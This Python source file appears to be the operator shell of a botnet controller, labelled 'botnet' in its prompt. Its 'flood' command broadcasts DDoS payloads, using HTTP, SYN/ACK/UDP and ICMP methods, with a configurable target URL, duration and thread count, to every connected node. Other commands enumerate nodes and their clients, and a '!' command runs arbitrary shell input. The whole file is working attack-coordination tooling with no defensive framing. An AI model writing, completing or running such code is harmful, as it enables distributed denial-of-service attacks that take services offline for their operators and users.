import json
import random
from pathlib import Path
import atexit
import readline
import getpass
import subprocess
import re
from colorama import Fore, Style, init

USERS_PERMISSION_TABLE = {
    "root": {"level": 3, "shell_color": Fore.RED},
}

class Command:
    def __init__(self, name, func, level=1, usage="", description=""):
        self.name = name
        self.func = func
        self.level = level
        self.usage = usage
        self.description = description

class Payloads:
    @staticmethod
    def flood(url, duration, method, threads):
        return json.dumps({
            "action": "flood",
            "data": {"url": url, "duration": duration, "method": method, "threads": threads}
        })

    @staticmethod
    def ping():
        return json.dumps({"action": "ping"})

    @staticmethod
    def sync_nodes():
        try:
            nodes_file = Path("data/nodes.json")
            if not nodes_file.exists():
                raise FileNotFoundError("nodes.json not found")
            with nodes_file.open("r") as f:
                nodes = json.load(f)
            data = [f"{node[0]}:{node[1]}" for node in nodes]
            return json.dumps({"action": "sync_nodes", "data": data})
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f"{Fore.RED}Error: Failed to load nodes.json: {e}{Style.RESET_ALL}")
            return json.dumps({"action": "sync_nodes", "data": []})

    @staticmethod
    def status():
        return json.dumps({"action": "status"})
    
    @staticmethod
    def get_clients():
        return json.dumps({"action": "get_clients"})

class Functions:
    def __init__(self, controller, shell):
        self.controller = controller
        self.shell = shell

    def send_flood(self, url, duration=30, method="GET", threads=100):
        resp, result = self.controller.send_to_all(Payloads.flood(url, duration, method, threads))
        print(f"{Fore.GREEN if result is True else Fore.RED}"
              f"{'Success: Flood payload sent to all nodes' if result is True else f'Error: Failed to send flood payload: {result}'}: {url}{Style.RESET_ALL}")

    def send_ping(self):
        resp, result = self.controller.send_to_all(Payloads.ping())
        print(f"{Fore.GREEN if result is True else Fore.RED}"
              f"{'Success: Ping sent to all nodes' if result is True else f'Error: Failed to send ping: {result}'}{Style.RESET_ALL}")
        
    def send_status(self):
        resp, result = self.controller.send_to_all(Payloads.status())
        print(f"{Fore.GREEN if result is True else Fore.RED}"
              f"{'Success: Status request sent to all nodes' if result is True else f'Error: Failed to send status request: {result}'}{Style.RESET_ALL}")
        return resp 

    def send_sync(self):
        resp, result = self.controller.send_to_all(Payloads.sync_nodes())
        print(f"{Fore.GREEN if result is True else Fore.RED}"
              f"{'Success: Sync sent to all nodes' if result is True else f'Error: Failed to send sync: {result}'}{Style.RESET_ALL}")
        return resp 
        
    def send_get_clients(self):
        resp, result = self.controller.send_to_all(Payloads.get_clients())
        print(f"{Fore.GREEN if result is True else Fore.RED}"
              f"{'Success: Get clients sent to all nodes' if result is True else f'Error: Failed to send get clients: {result}'}{Style.RESET_ALL}")
        return resp 

class Commands:
    VALID_METHODS = {
        "L7": ["GET", "POST", "PUT", "DELETE", "HEAD", "DNS"],
        "L4": ["ACK", "SYN", "FIN", "RST", "TCP", "UDP"],
        "L3": ["ICMP"]
    }

    def __init__(self, controller, shell):
        self.controller = controller
        self.shell = shell
        self.functions = Functions(controller, shell)

    def _parse_arg(self, args, index, default=None, cast=str):
        try:
            return cast(args[index])
        except (IndexError, ValueError, TypeError):
            return default

    def _validate_url(self, url):
        if not url:
            return False
        url_pattern = re.compile(
            r'^(https?://)?'
            r'((?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}|'
            r'(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}'
            r'(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'
            r'(:[0-9]+)?'
            r'(/.*)?$'
        )
        return bool(url_pattern.match(url))

    def _print_node_table(self, nodes, include_status=False):
        if not nodes:
            print(f"{Fore.YELLOW}No nodes connected{Style.RESET_ALL}")
            return
        headers = ["ID", "Address", "Port"] + (["Status"] if include_status else [])
        widths = [36, 20, 10] + ([10] if include_status else [])
        print(f"\nConnected Nodes:\n{' '.join(f'{h:<{w}}' for h, w in zip(headers, widths))}\n{'-' * sum(widths)}")
        for node in nodes:
            node_id, host, port = node[:3]
            row = [node_id, host, str(port)]
            if include_status:
                row.append(node[3] if len(node) > 3 else "Unknown")
            print(' '.join(f'{v:<{w}}' for v, w in zip(row, widths)))

    def _print_clients_table(self, clients_by_node):
        if not clients_by_node:
            print(f"{Fore.YELLOW}No client data available{Style.RESET_ALL}")
            return

        total_clients = 0
        print(f"\nClients per Node:{Style.RESET_ALL}")
        for node_id, node_info in clients_by_node.items():
            clients = node_info.get('data', {})
            client_count = len(clients)
            total_clients += client_count

            print(f"\nNode ID: {Fore.CYAN}{node_id}{Style.RESET_ALL} - Total Clients: {Fore.GREEN}{client_count}{Style.RESET_ALL}")
            if not clients:
                print(f"  {Fore.YELLOW}No clients connected to this node{Style.RESET_ALL}")
                continue

            headers = ["Client ID", "IP Address", "Port"]
            widths = [12, 20, 8]
            line = "  " + "  ".join(f"{h:<{w}}" for h, w in zip(headers, widths))
            sep = "  " + "---".join("-" * w for w in widths)

            print(line)
            print(sep)
            for client_id, info in clients.items():
                ip, port = info.get("addr", ["N/A", "N/A"])
                row = [client_id, ip, str(port)]
                print("  " + " | ".join(f"{v:<{w}}" for v, w in zip(row, widths)))

        print(f"\n{Fore.YELLOW}Total clients across all nodes: {Fore.GREEN}{total_clients}{Style.RESET_ALL}")


    def help(self, shell, args):
        if args:
            cmd_name = args[0]
            if cmd_name in shell.commands and shell.user_level >= shell.commands[cmd_name].level:
                cmd = shell.commands[cmd_name]
                print(f"\nCommand: {cmd.name}\n  Usage: {cmd.usage}\n  Description: {cmd.description}\n  Level: {cmd.level}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Error: Unknown command '{cmd_name}' or insufficient permissions{Style.RESET_ALL}")
            return

        print(f"\nAvailable Commands:{Style.RESET_ALL}")
        categories = {"General": [], "Node Management": [], "Attack": []}
        for cmd in sorted(shell.commands.values(), key=lambda x: x.name):
            if shell.user_level < cmd.level:
                continue
            category = "Attack" if cmd.name == "flood" else "Node Management" if cmd.name in ["nodes", "ping"] else "General"
            categories[category].append(cmd)

        for category, cmds in categories.items():
            if cmds:
                print(f"\n{category}:")
                for cmd in cmds:
                    print(f"  {Fore.YELLOW}{cmd.name:<10}{Style.RESET_ALL} - {cmd.description} (level {cmd.level})")

    def shell_exec(self, shell, args):
        if not args:
            print(f"{Fore.RED}Usage: ! <command>{Style.RESET_ALL}")
            return
        command = " ".join(args)
        try:
            result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True, timeout=30)
            print(result.stdout)
        except subprocess.SubprocessError as e:
            print(f"{Fore.RED}Error executing command: {e}{Style.RESET_ALL}")

    def flood(self, shell, args):
        url = self._parse_arg(args, 0, default=None, cast=str)
        if not self._validate_url(url):
            print(f"{Fore.RED}Usage: {shell.commands['flood'].usage}\nError: Invalid or missing URL{Style.RESET_ALL}")
            return

        duration = self._parse_arg(args, 1, default=30, cast=int)
        method = self._parse_arg(args, 2, default="GET", cast=str).upper()
        threads = self._parse_arg(args, 3, default=100, cast=int)

        all_methods = sum(self.VALID_METHODS.values(), [])
        if method not in all_methods:
            print(f"{Fore.RED}Error: Invalid method '{method}'. Use 'methods' command to see valid options.{Style.RESET_ALL}")
            return

        if duration <= 0 or threads <= 0:
            print(f"{Fore.RED}Error: Duration and threads must be positive integers.{Style.RESET_ALL}")
            return

        print(f"\nFlood Confirmation:\n  URL:      {Fore.YELLOW}{url}{Style.RESET_ALL}\n"
              f"  Duration: {Fore.YELLOW}{duration} seconds{Style.RESET_ALL}\n"
              f"  Method:   {Fore.YELLOW}{method}{Style.RESET_ALL}\n"
              f"  Threads:  {Fore.YELLOW}{threads}{Style.RESET_ALL}\n")
        confirm = input(f"Proceed? (y/N) > {Style.RESET_ALL}").strip().lower()
        if confirm not in {"y", "yes"}:
            print(f"{Fore.YELLOW}Flood cancelled{Style.RESET_ALL}")
            return

        self.functions.send_flood(url, duration, method, threads)

    def ping(self, shell, args):
        self.functions.send_ping()

    def nodes(self, shell, args):
        if not args:
            print(f"{Fore.RED}Usage: nodes <list/status/sync/clients/disconnect> [node_id]{Style.RESET_ALL}")
            return

        subcmd = args[0].lower()
        nodes = self.controller.get_nodes()

        if subcmd == "list":
            self._print_node_table(nodes)

        elif subcmd == "status":
            if not nodes:
                print(f"{Fore.YELLOW}No nodes connected{Style.RESET_ALL}")
                return
            self.functions.send_status()

            self._print_node_table([(n[0], n[1], n[2], "Connected") for n in nodes], include_status=True)

        elif subcmd == "sync":
            self.functions.send_sync()

        elif subcmd == "clients":
            resp = self.functions.send_get_clients()
            self._print_clients_table(resp)

        elif subcmd == "disconnect":
            node_id = self._parse_arg(args, 1, default=None, cast=str)
            if not node_id:
                print(f"{Fore.RED}Usage: nodes disconnect <node_id>{Style.RESET_ALL}")
                return
            if not any(n[0] == node_id for n in nodes):
                print(f"{Fore.RED}Error: Node ID {node_id} not found{Style.RESET_ALL}")
                return
            self.controller.disconnect_node(node_id)
            print(f"{Fore.GREEN}Success: Disconnected node {node_id}{Style.RESET_ALL}")

        else:
            print(f"{Fore.RED}Error: Unknown subcommand '{subcmd}'. Use: nodes <list/status/sync/disconnect>{Style.RESET_ALL}")

    def methods(self, shell, args):
        print(f"\nAvailable Flood Methods:{Style.RESET_ALL}")
        for layer, methods in self.VALID_METHODS.items():
            print(f"  {layer}: {Fore.YELLOW}{', '.join(methods)}{Style.RESET_ALL}")

    def quit(self, shell, args):
        self.controller.shutdown()
        shell.running = False
        print(f"{Fore.YELLOW}Exiting shell...{Style.RESET_ALL}")

class Shell:
    def __init__(self, controller):
        init(autoreset=True)
        self.controller = controller
        self.user = getpass.getuser()
        self.user_level = USERS_PERMISSION_TABLE.get(self.user, {"level": 1, "shell_color": Fore.GREEN})["level"]
        USERS_PERMISSION_TABLE.setdefault(self.user, {"level": 1, "shell_color": Fore.GREEN})
        self.running = True
        self.commands = {
            name: Command(name, func, level, usage, desc)
            for name, func, level, usage, desc in [
                ("help", self._help, 1, "help [command]", "Show available commands or details for a specific command"),
                ("quit", self._quit, 1, "quit", "Exit the shell"),
                ("exit", self._quit, 1, "exit", "Exit the shell"),
                ("flood", self._flood, 3, "flood <url> [duration] [method] [threads]", "Initiate a flood attack on a URL"),
                ("nodes", self._nodes, 2, "nodes <list/status/sync/disconnect> [node_id]", "Manage nodes (list, check status, sync, or disconnect)"),
                ("methods", self._methods, 1, "methods", "List available flood methods"),
                ("ping", self._ping, 2, "ping", "Ping all nodes"),
                ("!", self._shell_exec, 1, "! <command>", "Execute a shell command"),
            ]
        }
        self.commands_impl = Commands(controller, self)
        self._setup_readline()
        self._display_banner()

    def _help(self, shell, args): self.commands_impl.help(shell, args)
    def _quit(self, shell, args): self.commands_impl.quit(shell, args)
    def _flood(self, shell, args): self.commands_impl.flood(shell, args)
    def _nodes(self, shell, args): self.commands_impl.nodes(shell, args)
    def _methods(self, shell, args): self.commands_impl.methods(shell, args)
    def _ping(self, shell, args): self.commands_impl.ping(shell, args)
    def _shell_exec(self, shell, args): self.commands_impl.shell_exec(shell, args)

    def _setup_readline(self):
        readline.set_completer(self._complete)
        readline.parse_and_bind("tab: complete")
        self.history_file = Path("~/.shell_history").expanduser()
        try:
            if self.history_file.exists():
                readline.read_history_file(self.history_file)
        except (OSError, IOError) as e:
            print(f"{Fore.RED}Error loading history file: {e}{Style.RESET_ALL}")
        readline.set_history_length(1000)
        atexit.register(self._save_history)

    def _display_banner(self):
        try:
            banner_file = Path("core/banners.json")
            if not banner_file.exists():
                raise FileNotFoundError("banners.json not found")
            with banner_file.open("r") as f:
                banners = json.load(f)
            banner = random.choice(banners).encode('utf-8').decode('unicode_escape')
            print(f"{Fore.CYAN}{banner}{Style.RESET_ALL}")
            print()
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f"{Fore.RED}Error loading banners: {e}{Style.RESET_ALL}")

    def _complete(self, text, state):
        if text.startswith("nodes "):
            subcommands = ["list", "status", "sync", "disconnect"]
            subtext = text.split(" ")[1] if len(text.split(" ")) > 1 else ""
            options = [f"nodes {subcmd}" for subcmd in subcommands if subcmd.startswith(subtext)]
            if subtext.startswith("disconnect"):
                nodes = self.controller.get_nodes()
                options.extend(f"nodes disconnect {node_id}" for node_id, _, _ in nodes if node_id.startswith(text.split(" ")[2] if len(text.split(" ")) > 2 else ""))
        elif text.startswith("flood "):
            parts = text.split(" ")
            if len(parts) == 2:
                options = [f"flood {parts[1]} {method}" for method in sum(self.commands_impl.VALID_METHODS.values(), [])]
            else:
                options = []
        else:
            options = [cmd for cmd in self.commands if cmd.startswith(text) and self.user_level >= self.commands[cmd].level]
        return options[state] if state < len(options) else None

    def _save_history(self):
        try:
            readline.write_history_file(self.history_file)
        except (OSError, IOError) as e:
            print(f"{Fore.RED}Error saving history file: {e}{Style.RESET_ALL}")

    def run(self):
        print(f"Type 'help' for a list of commands{Style.RESET_ALL}\n")
        while self.running:
            try:
                prompt = f"{USERS_PERMISSION_TABLE[self.user]['shell_color']}{self.user}@{Fore.BLUE}botnet{Style.RESET_ALL} $ "
                raw_input = input(prompt).strip()
                if not raw_input:
                    continue

                parts = raw_input.split()
                cmd_name, args = parts[0], parts[1:]

                if cmd_name not in self.commands:
                    print(f"{Fore.RED}Error: Unknown command '{cmd_name}'. Type 'help' for commands.{Style.RESET_ALL}")
                    continue

                if self.user_level < self.commands[cmd_name].level:
                    print(f"{Fore.RED}Error: Permission denied (Level {self.commands[cmd_name].level} required){Style.RESET_ALL}")
                    continue

                self.commands[cmd_name].func(self, args)

            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}Interrupted. Type 'quit' to exit.{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
            print("")